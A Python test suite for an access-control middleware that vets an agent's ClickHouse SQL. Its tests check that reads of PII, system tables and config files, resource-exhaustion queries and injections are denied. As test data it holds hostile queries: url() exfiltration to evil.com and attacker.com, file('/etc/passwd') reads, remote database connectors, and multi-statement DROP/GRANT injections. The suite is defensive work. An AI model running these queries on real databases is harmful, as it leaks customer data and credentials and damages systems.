"""Tests for the Access Control Service."""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from access_control import AccessControlService, Decision, QueryType


def make_service():
    return AccessControlService()


class TestQueryClassification:
    def test_select_row(self):
        ac = make_service()
        qt = ac.analyzer.classify_query("SELECT email FROM sao.customers LIMIT 10")
        assert qt == QueryType.SELECT_ROW

    def test_aggregate(self):
        ac = make_service()
        qt = ac.analyzer.classify_query(
            "SELECT city, AVG(credit_score) FROM sao.customers GROUP BY city"
        )
        assert qt == QueryType.AGGREGATE

    def test_count_is_aggregate(self):
        ac = make_service()
        qt = ac.analyzer.classify_query("SELECT COUNT(*) FROM sao.customers")
        assert qt == QueryType.AGGREGATE

    def test_ddl(self):
        ac = make_service()
        qt = ac.analyzer.classify_query("DROP TABLE sao.customers")
        assert qt == QueryType.DDL

    def test_dml(self):
        ac = make_service()
        qt = ac.analyzer.classify_query("INSERT INTO sao.customers VALUES (1, 'a')")
        assert qt == QueryType.DML

    def test_system_cmd(self):
        ac = make_service()
        qt = ac.analyzer.classify_query("SYSTEM SHUTDOWN")
        assert qt == QueryType.SYSTEM_CMD


class TestAccessControl:
    def test_deny_pii_row_access(self):
        ac = make_service()
        result = ac.check("agent", "SELECT email, full_name FROM sao.customers LIMIT 10")
        assert result.decision == Decision.DENY
        assert "PII" in result.reason or "sensitive" in result.reason.lower()

    def test_allow_safe_table(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT category, SUM(total_amount) FROM sao.revenue_daily GROUP BY category",
        )
        assert result.decision == Decision.ALLOW

    def test_deny_system_table(self):
        ac = make_service()
        result = ac.check("agent", "SELECT * FROM system.columns")
        assert result.decision == Decision.DENY

    def test_deny_ddl(self):
        ac = make_service()
        result = ac.check("agent", "DROP TABLE sao.customers")
        assert result.decision == Decision.DENY

    def test_deny_dml(self):
        ac = make_service()
        result = ac.check("agent", "INSERT INTO sao.customers VALUES (1, 'test')")
        assert result.decision == Decision.DENY

    def test_allow_aggregation_over_financial(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT city, AVG(credit_score) FROM sao.customers GROUP BY city",
        )
        assert result.decision == Decision.ALLOW

    def test_deny_row_level_financial(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT customer_id, credit_score FROM sao.customers LIMIT 100",
        )
        assert result.decision == Decision.DENY

    def test_deny_dangerous_functions(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM url('http://evil.com/exfil', CSV, 'a String')",
        )
        assert result.decision == Decision.DENY

    def test_deny_card_last4(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT card_last4, ip_address FROM sao.transactions LIMIT 10",
        )
        assert result.decision == Decision.DENY

    def test_admin_unrestricted(self):
        ac = make_service()
        result = ac.check(
            "agent_unrestricted",
            "SELECT email FROM sao.customers LIMIT 10",
        )
        assert result.decision == Decision.ALLOW

    def test_deny_system_shutdown(self):
        ac = make_service()
        result = ac.check("agent", "SYSTEM SHUTDOWN")
        assert result.decision == Decision.DENY

    def test_deny_query_log_snooping(self):
        ac = make_service()
        result = ac.check("agent", "SELECT query FROM system.query_log LIMIT 10")
        assert result.decision == Decision.DENY

    def test_deny_process_list(self):
        ac = make_service()
        result = ac.check("agent", "SELECT * FROM system.processes")
        assert result.decision == Decision.DENY

    def test_deny_create_user(self):
        ac = make_service()
        result = ac.check("agent", "CREATE USER hacker IDENTIFIED BY 'password'")
        assert result.decision == Decision.DENY

    def test_deny_fraud_score_row(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT customer_id, fraud_score FROM sao.transactions WHERE fraud_score > 0.9",
        )
        assert result.decision == Decision.DENY

    def test_allow_safe_product_query(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT name, category, price_cents FROM sao.products WHERE is_active = 1",
        )
        assert result.decision == Decision.ALLOW


class TestResourceExhaustion:
    """Tests for SQL-level resource exhaustion detection."""

    # -- Cartesian join detection --

    def test_deny_cross_join(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM sao.customers CROSS JOIN sao.transactions",
        )
        assert result.decision == Decision.DENY
        assert "Cartesian" in result.reason or "CROSS JOIN" in result.reason

    def test_deny_join_without_on(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM sao.customers JOIN sao.transactions",
        )
        assert result.decision == Decision.DENY
        assert "Cartesian" in result.reason or "ON/USING" in result.reason

    def test_deny_comma_join(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM sao.customers, sao.transactions",
        )
        assert result.decision == Decision.DENY
        assert "Cartesian" in result.reason

    def test_allow_join_with_on(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT category, SUM(total_amount) FROM sao.revenue_daily r "
            "JOIN sao.products p ON r.category = p.category GROUP BY category",
        )
        assert result.decision == Decision.ALLOW

    # -- Memory bomb detection --

    def test_deny_arrayjoin_range_large(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT arrayJoin(range(1000000)) AS n FROM sao.revenue_daily",
        )
        assert result.decision == Decision.DENY
        assert "arrayJoin" in result.reason

    def test_allow_arrayjoin_range_small(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT arrayJoin(range(100)) AS n FROM sao.revenue_daily",
        )
        # Small range should not trigger resource exhaustion
        assert "arrayJoin" not in result.reason if result.decision == Decision.DENY else True

    def test_deny_numbers_large(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT number FROM numbers(100000000)",
        )
        assert result.decision == Decision.DENY
        assert "numbers" in result.reason

    def test_allow_numbers_small(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT number FROM numbers(1000)",
        )
        # Small numbers() should not trigger resource exhaustion for this reason
        assert "numbers" not in (result.reason if result.decision == Decision.DENY else "")

    # -- Regexp full scan detection --

    def test_deny_leading_wildcard_like_on_large_table(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT COUNT(*) FROM sao.transactions WHERE user_agent LIKE '%bot%'",
        )
        assert result.decision == Decision.DENY
        assert "LIKE" in result.reason or "wildcard" in result.reason

    def test_deny_match_on_large_table(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT COUNT(*) FROM sao.customers WHERE match(email, '.*@gmail\\.com')",
        )
        assert result.decision == Decision.DENY
        assert "match" in result.reason

    def test_deny_extractall_on_large_table(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT extractAll(user_agent, 'Mozilla/[0-9]+') FROM sao.transactions",
        )
        assert result.decision == Decision.DENY
        assert "extractAll" in result.reason or "full scan" in result.reason

    def test_allow_like_on_small_table(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT name FROM sao.products WHERE name LIKE '%widget%'",
        )
        # products is not in the large_tables set, so this should be OK
        assert result.decision == Decision.ALLOW

    def test_allow_trailing_wildcard_like(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT COUNT(*) FROM sao.transactions WHERE category LIKE 'electronics%'",
        )
        # Trailing wildcard can use indexes, should not be flagged
        assert "wildcard" not in (result.reason if result.decision == Decision.DENY else "")

    # -- Unbounded high-cardinality GROUP BY --

    def test_deny_group_by_ip_address_no_limit(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT ip_address, COUNT(*) FROM sao.transactions GROUP BY ip_address",
        )
        assert result.decision == Decision.DENY
        assert "high-cardinality" in result.reason or "ip_address" in result.reason

    def test_deny_group_by_user_agent_no_limit(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT user_agent, COUNT(*) FROM sao.transactions GROUP BY user_agent",
        )
        assert result.decision == Decision.DENY
        assert "high-cardinality" in result.reason or "user_agent" in result.reason

    def test_allow_group_by_high_cardinality_with_limit(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT ip_address, COUNT(*) FROM sao.transactions GROUP BY ip_address LIMIT 100",
        )
        # LIMIT present, so high-cardinality GROUP BY should be allowed
        assert "high-cardinality" not in (result.reason if result.decision == Decision.DENY else "")

    def test_allow_group_by_safe_column(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT category, SUM(total_amount) FROM sao.revenue_daily GROUP BY category",
        )
        assert result.decision == Decision.ALLOW

    # -- Integration: resource exhaustion checked before policy --

    def test_resource_exhaustion_blocks_even_admin(self):
        """Resource exhaustion should be checked before role-based policy."""
        ac = make_service()
        # Even though agent_unrestricted maps to admin, resource exhaustion
        # is checked first and should still deny.
        result = ac.check(
            "agent_unrestricted",
            "SELECT * FROM sao.customers CROSS JOIN sao.transactions",
        )
        assert result.decision == Decision.DENY
        assert "Resource exhaustion" in result.reason


class TestAdvancedInjectionBeyondReadonly:
    """Tests for injection patterns that ClickHouse readonly=1 does NOT block.

    These verify the middleware's *delta* over baseline ClickHouse security.
    Each test targets a vector that would succeed against a readonly user
    but is caught by the middleware's AST-level / pattern-level inspection.
    """

    # ── Data exfiltration via table functions ──

    def test_deny_url_exfiltration(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM url('http://attacker.com/steal?d=1', CSV, 'a String')",
        )
        assert result.decision == Decision.DENY
        assert "url" in result.reason.lower()

    def test_deny_url_with_concat(self):
        """url() with string concatenation to build exfil URL."""
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM url('http://evil.com/collect', CSV, 'line String')",
        )
        assert result.decision == Decision.DENY

    # ── File system access ──

    def test_deny_file_etc_passwd(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM file('/etc/passwd', TSV, 'line String')",
        )
        assert result.decision == Decision.DENY
        assert "file" in result.reason.lower()

    def test_deny_file_clickhouse_config(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM file('/etc/clickhouse-server/users.xml', TSV, 'line String')",
        )
        assert result.decision == Decision.DENY

    # ── Remote server probing ──

    def test_deny_remote_function(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM remote('attacker.com:9000', 'system', 'one')",
        )
        assert result.decision == Decision.DENY
        assert "remote" in result.reason.lower()

    def test_deny_remote_secure_function(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM remoteSecure('attacker.com:9440', 'system', 'one')",
        )
        assert result.decision == Decision.DENY

    # ── External database connectors ──

    def test_deny_mysql_function(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM mysql('attacker.com:3306', 'db', 'users', 'root', 'pw')",
        )
        assert result.decision == Decision.DENY
        assert "mysql" in result.reason.lower()

    def test_deny_postgresql_function(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM postgresql('attacker.com:5432', 'db', 'users', 'root', 'pw')",
        )
        assert result.decision == Decision.DENY

    def test_deny_jdbc_function(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM jdbc('jdbc:mysql://attacker.com/db', 'users')",
        )
        assert result.decision == Decision.DENY
        assert "jdbc" in result.reason.lower()

    def test_deny_odbc_function(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM odbc('DSN=attacker', 'users')",
        )
        assert result.decision == Decision.DENY
        assert "odbc" in result.reason.lower()

    # ── Cloud / distributed storage ──

    def test_deny_s3_function(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM s3('https://bucket.s3.amazonaws.com/data.csv', CSV, 'l String')",
        )
        assert result.decision == Decision.DENY
        assert "s3" in result.reason.lower()

    def test_deny_s3cluster_function(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM s3Cluster('default', 'https://bucket.s3.amazonaws.com/data.csv')",
        )
        assert result.decision == Decision.DENY

    def test_deny_hdfs_function(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM hdfs('hdfs://namenode:9000/data.csv', CSV, 'l String')",
        )
        assert result.decision == Decision.DENY
        assert "hdfs" in result.reason.lower()

    # ── Cluster / infrastructure probing ──

    def test_deny_cluster_function(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM cluster('default', system, one)",
        )
        assert result.decision == Decision.DENY
        assert "cluster" in result.reason.lower()

    # ── Streaming input ──

    def test_deny_input_function(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT * FROM input('x String') FORMAT CSV",
        )
        assert result.decision == Decision.DENY
        assert "input" in result.reason.lower()

    # ── System table information leakage ──
    # readonly=1 allows reading system.* tables

    def test_deny_system_processes(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT query, user, elapsed FROM system.processes",
        )
        assert result.decision == Decision.DENY
        assert "system" in result.reason.lower()

    def test_deny_system_query_log(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT query, user FROM system.query_log LIMIT 100",
        )
        assert result.decision == Decision.DENY

    def test_deny_system_columns(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT database, table, name, type FROM system.columns",
        )
        assert result.decision == Decision.DENY

    def test_deny_system_tables(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT database, name, engine FROM system.tables",
        )
        assert result.decision == Decision.DENY

    def test_deny_system_users(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT name, storage, auth_type FROM system.users",
        )
        assert result.decision == Decision.DENY

    def test_deny_system_settings(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT name, value, changed FROM system.settings WHERE changed = 1",
        )
        assert result.decision == Decision.DENY

    # ── Multi-statement injection ──

    def test_deny_multi_statement_drop(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT 1; DROP TABLE sao.customers;",
        )
        assert result.decision == Decision.DENY
        assert "multi-statement" in result.reason.lower() or "Multi-statement" in result.reason

    def test_deny_multi_statement_insert(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT 1; INSERT INTO sao.customers VALUES (0, 'x', 'y');",
        )
        assert result.decision == Decision.DENY

    def test_deny_multi_statement_grant(self):
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT 1; GRANT ALL ON *.* TO agent;",
        )
        assert result.decision == Decision.DENY

    def test_allow_single_statement_trailing_semicolon(self):
        """A single SELECT with a trailing semicolon is fine."""
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT category, SUM(total_amount) FROM sao.revenue_daily GROUP BY category;",
        )
        assert result.decision == Decision.ALLOW

    def test_allow_normal_select(self):
        """Ensure the new checks don't break legitimate queries."""
        ac = make_service()
        result = ac.check(
            "agent",
            "SELECT name, category, price_cents FROM sao.products WHERE is_active = 1",
        )
        assert result.decision == Decision.ALLOW


if __name__ == "__main__":
    import pytest
    pytest.main([__file__, "-v"])
